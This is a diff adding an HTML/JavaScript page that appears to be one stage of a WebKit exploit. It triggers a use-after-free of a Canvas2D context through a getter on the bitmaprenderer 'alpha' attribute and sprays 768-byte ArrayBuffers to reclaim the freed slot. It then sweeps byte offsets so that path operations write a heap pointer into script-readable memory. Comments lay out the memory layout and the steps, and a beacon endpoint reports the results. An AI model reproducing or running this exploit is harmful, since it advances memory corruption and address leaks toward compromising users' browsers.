@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V686 AB reclaim + path leak</title></head>
+<body><pre id="out">V686 — can a 768B ArrayBuffer take the freed slot, and can path ops leak a pointer?</pre>
+<script>
+/* V686
+ *
+ * V685 proved: the FIRST touch of the freed context (even a byte read via
+ * getContextAttributes) kills the renderer, while the same calls work fine
+ * once the slot has been reallocated by a fresh 2d context (V684 whoami).
+ * => the slot must be reclaimed BEFORE it is used.
+ *
+ * V686 tests foreign-type reclaim with ArrayBuffer(768) and then uses the
+ * ONE family of Canvas2D calls that never touches m_stateStack and never
+ * touches m_canvas per element: the path builder.
+ *
+ *   beginPath()  -> m_path.clear()          (no state, no canvas)
+ *   moveTo(x,y)  -> Path::moveTo            (no state, no canvas)
+ *
+ * In current WebKit, Path is
+ *   Variant<monostate, PathSegment, DataRef<PathImpl>> m_data
+ * so: first moveTo() stores an inline segment (no allocation), second
+ * moveTo() must allocate a PathImpl and store its heap pointer *inside the
+ * context object*.  If the context object IS our ArrayBuffer, that pointer
+ * lands in memory we can read from JS => heap address leak, no prior leak
+ * needed.
+ *
+ * 1st guard: CanvasPath::moveTo bails out when !hasInvertibleTransform().
+ * Zeroed bytes mean "false", so we first have to find/flip
+ * m_hasInvertibleTransform.  Layout is (CanvasPath is the 2nd base):
+ *   +40 CanvasPath vptr, +48 Path, then bool m_hasInvertibleTransform.
+ * We do not know sizeof(Path) exactly, so the probe sweeps the candidate
+ * byte offset 60..111: for each candidate it zeroes all buffers, sets that
+ * one byte to 1, runs the path ops, and scans all buffers.  The first
+ * candidate that produces non-zero bytes outside the patched byte is the
+ * flag, and the same scan may already contain the PathImpl pointer.
+ *
+ * Modes: op=abattr | op=abpath | op=reset
+ */
+'use strict';
+var PARAM = {};
+try {
+  var parts = location.search.replace(/^\?/, '').split('&');
+  for (var qi = 0; qi < parts.length; qi++) {
+    if (!parts[qi]) continue;
+    var kv = parts[qi].split('=');
+    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
+  }
+} catch (e) {}
+
+var MODE = PARAM.op || 'abattr';
+var NAB  = parseInt(PARAM.n || '64', 10);
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+function st() {
+  try { if (window.localStorage) return window.localStorage; } catch (e) {}
+  try { if (window.sessionStorage) return window.sessionStorage; } catch (e) {}
+  return null;
+}
+var ST = st();
+function stGet(k) { try { return ST ? ST.getItem(k) : null; } catch (e) { return null; } }
+function stSet(k, v) { try { if (ST) ST.setItem(k, v); } catch (e) {} }
+
+function bk(tag, body) {
+  try { new Image().src = '/beacon/V686-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now(); } catch (e) {}
+}
+function bks(tag, body) {
+  var u = '/beacon/V686-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); } catch (e) {}
+}
+
+function clearOnce() {
+  var n = 0, pref = ['v683c_', 'v684c_', 'v685c_', 'v686c_'];
+  try {
+    var keys = [];
+    for (var k = 0; k < ST.length; k++) keys.push(ST.key(k));
+    for (var j = 0; j < keys.length; j++) {
+      for (var p = 0; p < pref.length; p++) {
+        if (keys[j] && keys[j].indexOf(pref[p]) === 0) { ST.removeItem(keys[j]); n++; break; }
+      }
+    }
+  } catch (e) {}
+  return n;
+}
+
+function hex64(dv, o) {
+  var lo = dv.getUint32(o, true) >>> 0, hi = dv.getUint32(o + 4, true) >>> 0;
+  var l = lo.toString(16), h = hi.toString(16);
+  while (l.length < 8) l = '0' + l;
+  while (h.length < 8) h = '0' + h;
+  return h + l;
+}
+
+/* count non-zero 8-byte words, ignoring the single patched byte */
+function scanView(u, dv, cand) {
+  var keep = u[cand];
+  u[cand] = 0;
+  var n = 0, list = [], ptr = '', ptrOff = -1;
+  for (var o = 0; o + 8 <= u.length; o += 8) {
+    var lo = dv.getUint32(o, true) >>> 0, hi = dv.getUint32(o + 4, true) >>> 0;
+    if (!lo && !hi) continue;
+    n++;
+    if (list.length < 9) list.push(o + ':' + hex64(dv, o));
+    if (ptrOff < 0 && hi === 0 && lo >= 0x10000000) { ptrOff = o; ptr = hex64(dv, o); }
+  }
+  u[cand] = keep;
+  return { n: n, list: list.join('|'), ptr: ptr, ptrOff: ptrOff };
+}
+
+if (MODE === 'reset' || PARAM.reset === '1') {
+  var cn = clearOnce();
+  bks('ORESET', 'cleared=1,once=' + cn);
+  say('v683/v684/v685/v686 guards cleared. Reload the index.');
+}
+
+if (MODE !== 'reset') {
+  var onceKey = 'v686c_' + MODE;
+  var once = PARAM.once === '1';
+  var blocked = false;
+  if (once) {
+    if (stGet(onceKey) === '1') blocked = true;
+    else stSet(onceKey, '1');
+  }
+
+  if (blocked) {
+    bks('OBLOCK', 'op=' + MODE);
+    say('BLOCKED by once=1 for op=' + MODE + ' (tap RESET)');
+  } else {
+    setTimeout(function () { bk('OLATE', 'op=' + MODE + ',alive=1'); }, 2000);
+
+    bks('OBOOT', 'op=' + MODE + ',n=' + NAB + ',once=' + (once ? 1 : 0));
+
+    var canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    document.body.appendChild(canvas);
+    window._v686canvas = canvas;
+
+    var savedCtx = null;
+    var dict = {};
+    Object.defineProperty(dict, 'alpha', {
+      get: function () {
+        var ctx = canvas.getContext('2d');
+        if (!ctx) return true;
+        savedCtx = ctx;
+        window._v686ctx = ctx;
+        try { ctx.lineWidth = 3.14159; } catch (eI) {}
+        return true;
+      }
+    });
+
+    var bmpCtx = null;
+    try { bmpCtx = canvas.getContext('bitmaprenderer', dict); } catch (eJ) {}
+
+    /* synchronous: proves the trigger returned before any stale touch */
+    bks('OTRIG', 'op=' + MODE + ',bmp=' + (bmpCtx ? 1 : 0) + ',inner=' + (savedCtx ? 1 : 0));
+
+    if (!savedCtx || !bmpCtx) {
+      bks('OFAIL', 'inner=' + (savedCtx ? 1 : 0) + ',bmp=' + (bmpCtx ? 1 : 0));
+      say('ABORT: trigger failed');
+    } else {
+      /* ---- spray ArrayBuffers of the freed object's size class ---- */
+      var abs = [], vs = [], dvs = [];
+      for (var i = 0; i < NAB; i++) {
+        var ab = new ArrayBuffer(768);
+        abs.push(ab);
+        vs.push(new Uint8Array(ab));
+        dvs.push(new DataView(ab));
+      }
+      window._v686keep = { abs: abs, vs: vs };
+
+      if (MODE === 'abattr') {
+        /* if an AB owns the slot, m_settings is all zero => alpha=false */
+        var r = '';
+        try {
+          var at = savedCtx.getContextAttributes();
+          r = 'alpha=' + at.alpha + ',desync=' + at.desynchronized +
+              ',wrf=' + at.willReadFrequently + ',cs=' + at.colorSpace;
+          var hit = -1;
+          for (var q = 0; q < NAB && hit < 0; q++) {
+            var sc = scanView(vs[q], dvs[q], 0);
+            if (sc.n) hit = q;
+          }
+          r += ',dirty=' + hit;
+        } catch (e1) { r = 'E!' + (e1.name || 'err'); }
+        bks('OSTEP', 'op=abattr,' + r);
+        say('abattr -> ' + r);
+
+      } else if (MODE === 'abpath') {
+        var win = -1, winCand = -1, dump = 'none', ptr = '';
+        for (var cand = 60; cand <= 111 && win < 0; cand++) {
+          for (var k = 0; k < NAB; k++) { vs[k].fill(0); vs[k][cand] = 1; }
+          try {
+            savedCtx.beginPath();
+            savedCtx.moveTo(1, 1);
+            savedCtx.moveTo(2, 2);
+            savedCtx.lineTo(3, 3);
+          } catch (e2) {}
+          for (k = 0; k < NAB; k++) {
+            var s2 = scanView(vs[k], dvs[k], cand);
+            if (s2.n > 0) {
+              win = k; winCand = cand;
+              dump = 'n=' + s2.n + ',w=' + s2.list;
+              ptr = s2.ptrOff < 0 ? 'na' : ('@' + s2.ptrOff + '=' + s2.ptr);
+              break;
+            }
+          }
+        }
+        if (win >= 0) {
+          var stk = '';
+          for (var b = 112; b < 128; b++) stk += ('0' + vs[win][b].toString(16)).slice(-2);
+          bks('OSTEP', 'op=abpath,win=' + win + ',cand=' + winCand + ',ptr=' + ptr +
+              ',stk=' + stk + ',' + dump);
+          say('abpath win=' + win + ' cand=' + winCand + ' ptr=' + ptr + ' stk=' + stk);
+          say(dump);
+        } else {
+          bks('OSTEP', 'op=abpath,win=-1,no-write');
+          say('abpath: no candidate produced a write (or no AB owns the slot)');
+        }
+      } else {
+        bks('OFAIL', 'unknown-op=' + MODE);
+        say('unknown op ' + MODE);
+      }
+    }
+  }
+}
+</script>
+</body></html>
